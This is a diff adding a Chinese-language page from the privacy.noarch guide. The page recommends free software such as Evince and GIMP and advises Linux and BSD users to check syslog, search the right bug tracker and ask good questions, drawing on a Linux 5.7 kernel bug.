+<p>这是因为他们根本不关心，或是很少关心这些用户的体验：2020 年，GNU/Linux 和 *BSD 的<a href="https://gs.statcounter.com/os-market-share/all/worldwide/2020">桌面市场占有率加起来还不到 MacOS 的七分之一</a>。</p>
+<p>而自由软件则是另一个故事了：它们的作者往往自己使用 GNU/Linux 或 *BSD，许多还专门为这些操作系统构建。</p>
+<p>例如 <a href="https://wiki.gnome.org/Apps/Evince">Evince</a>, 来自 GNOME 项目的 PDF 阅读器，虽然功能没有 Adobe Acrobat “全面”，但能保你轻松阅读和填写大多数 PDF 文档而不遇到奇怪问题。</p>
+<p>另一个例子是 <a href="https://www.gimp.org/">GIMP</a>, 尽管作者不喜欢它被这么叫，它依然被广泛称为“自由的 Photoshop”. 除了智能性比 Photoshop 差点，它能承担所有你在 Photoshop 上的任务。</p>
+<blockquote>
+<p><i class="fas fa-info-circle"></i> <code>privacy.noarch</code> 的首要任务之一就是让你更快上手各类自由软件！</p>
+</blockquote>
+<h2 id="多问问题问好问题"><a class="header" href="#多问问题问好问题">多问问题，问好问题</a></h2>
+<p>虽然作为一个 <del>内向的作曲家</del>，但是 <em>noarch</em> 依然想在最后说：<strong>请利用好社区资源。</strong></p>
+<p>GNU/Linux 和 *BSD 由数千个组件构成，当你遇到问题时，请弄清楚是哪个组件引发了你的问题；</p>
+<p>例如，你的电脑经常在使用过程中突然卡住，请查阅 <code>syslog</code>, 查出到底是某个软件，桌面环境，还是内核引起的问题。</p>
+<p>在你找出出问题的组件之后，请去它们对应的 bug tracker 搜索；因为如果你的问题确实由一个最近出现的 bug 引起，搜索引擎没法及时索引 bug tracker.</p>
+<p>例如 <em>noarch</em> 在 Linux 5.7 发布时遇到了<a href="https://bugzilla.kernel.org/show_bug.cgi?id=207383">一个巨大的 bug</a>, 它影响了所有 Polaris 11 架构的 AMD 显卡，包括 <em>noarch</em> 的 RX580 在内，使得 Linux 内核在运行几分钟到几十分钟不等时 panic.</p>
+<p><em>noarch</em> 在搜索引擎搜索无果，自己编译内核无果，后来才在 Linux kernel bugzilla 找到了这个问题。虽然没有参与测试，但 <em>noarch</em> 也得到了解决方案：将内核降级。幸运的是，降级到 Linux 5.6 之后，这个问题就消失了。</p>
+<p>如果你对问问题有更多的疑惑，可以参考<a href="https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/blob/main/README-zh_CN.md">提问的智慧</a>，它围绕 Hacker 社区的传统，详细讲解了如何问关于软件的问题。</p>
+<hr />
+<p>如果你发现 <em>noarch</em> 在本章漏了哪些重要内容，请别犹豫，<a href="https://t.me/noarchwastaken">问 <em>noarch</em></a> 或者为 <code>privacy.noarch</code> <a href="https://github.com/noarchwastaken/privacy/pulls">加上你想要的内容</a>。</p>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                        
+                            <a rel="prev" href="../../Tricks-Windows/VHD/VHD.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+                        
+
+                        
+                            <a rel="next" href="../../CONTRIBUTING.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+                        
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                
+                    <a rel="prev" href="../../Tricks-Windows/VHD/VHD.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+                
+
+                
+                    <a rel="next" href="../../CONTRIBUTING.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+                
+            </nav>
+
+        </div>
+
+        
+
+        
+
+        
+
+        
+        <script type="text/javascript">
+            window.playground_copyable = true;
+        </script>
+        
+
+        
+
+        
+
+        <script src="../../clipboard.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../highlight.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../book.js" type="text/javascript" charset="utf-8"></script>
+
+        <!-- Custom JS scripts -->
+        
+        <script type="text/javascript" src="../../sidebar.js"></script>
+        
+
+        
+
+    </body>
+</html>
